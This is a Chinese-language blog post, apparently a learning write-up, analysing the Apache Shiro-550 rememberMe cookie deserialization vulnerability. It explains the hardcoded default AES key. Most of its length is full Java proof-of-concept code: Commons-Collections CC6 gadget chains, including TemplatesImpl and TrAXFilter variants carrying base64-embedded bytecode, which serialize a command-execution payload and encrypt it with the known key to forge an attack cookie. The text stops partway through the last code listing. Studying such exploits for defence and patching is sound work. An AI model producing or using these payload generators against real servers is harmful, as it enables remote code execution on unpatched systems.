    <content type="html"><![CDATA[<h1 id="Shiro-550-反序列化漏洞"><a href="#Shiro-550-反序列化漏洞" class="headerlink" title="Shiro 550 反序列化漏洞"></a>Shiro 550 反序列化漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天跟着P神的文章学习了部分CC链，看多少忘多少…………（实在是太菜了），之后先跟着学习边学边复习吧。今天轮到了 shiro 反序列化，刚好再比赛中遇到了，但是我直接是靠工具怼的，属实是太菜了，所以这里简单学习一下原理。</p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Apache Shiro 是一个java框架，执行身份验证，授权，密码和会话管理。为了让浏览器或服务器重启之后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存再 Cookie 的 rememberMe 字段中，下次读取时就行解密再反序列化。再 1.2.4版本之前内置了一个默认且固定的加密 key，导致了攻击者可以伪造任意的 rememberMe Cookie 触发反序列化漏洞。</p><p>Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code><strong>和Shiro-721</strong><code>( Apache  Shiro &lt; 1.4.2 )</code><strong>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code>进而反序列化，对比Shiro550条件只要有<code>足够密钥库</code>（条件比较低）、Shiro721需要登录（要求比较高）。</p><p>攻击流程：</p><p><code>得到rememberMe的Cookie值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化</code></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接利用 IDEA 来搭建一个Tomcat环境并且运行起来，具体步骤可以直接去网上找</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230106404.png" alt="image-20211114230106404"></p><blockquote><p>这里利用的是P神的 shiroDemo</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230507402.png" alt="image-20211114230507402"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中找到默认的密钥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230954499.png" alt="image-20211114230954499"></p><p>payload的攻击流程就是<code>payload-&gt;AES加密-&gt;Base64加密</code></p><blockquote><p>先自己写一下CC6的链，然后再加密</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] fakeTransfomer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransfomer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Field field = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><span class="hljs-comment">// 对序列化的结果进行加密</span><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource ciphertxt = aes.encrypt(payload, key);<br>        System.out.println(ciphertxt.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接传过去会报错</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220713778.png" alt="image-20211115220713778"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220653539.png" alt="image-20211115220653539"></p><p>看了一下P神的文章，这里的报错的是因为<code>Transformer</code>数组的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115221233558.png" alt="image-20211115221233558"></p><p><strong>所以这里的问题就是要解决怎么样不使用数组来构造可利用链子？</strong></p><p>如果使用<code>TemplatesImpl</code>加载字节码的话，也是会有两个元素的数组的。能不能减少呢？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223038870.png" alt="image-20211115223038870"></p><p>可以利用上面的<code>getValue()</code>方法调用到<code>LazyMap()</code>的<code>get()</code>方法，之后利用<code>this.factory.transform(key)</code>来执行到<code>transformer()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223132095.png" alt="image-20211115223132095"></p><p>这里之前分析过，直接绕过<code>InvokerTransformer()</code>执行字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" alt="image-20211115222331941"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 最初的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>templates.newTransformer();<br><span class="hljs-comment">// CC3 中的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br><span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br><span class="hljs-comment">// 或者</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(templates),<br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里根据之前的payload看就可以直接把数组去掉然后直接构造</p><p>先构造好字节码，作用就是弹出计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234747396.png" alt="image-20211115234747396"></p><p>第一种 POC：根据<code>templates.newTransformer();</code>来直接构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> +<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,templates);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235103394.png" alt="image-20211115235103394"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235253251.png" alt="image-20211115235253251"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234618480.png" alt="image-20211115234618480"></p><p>第二种：利用<code>TrAXFilter</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116000340086.png" alt="image-20211116000340086"></p><p>利用上面的反射调用它的构造方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" alt="image-20211115222331941"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> 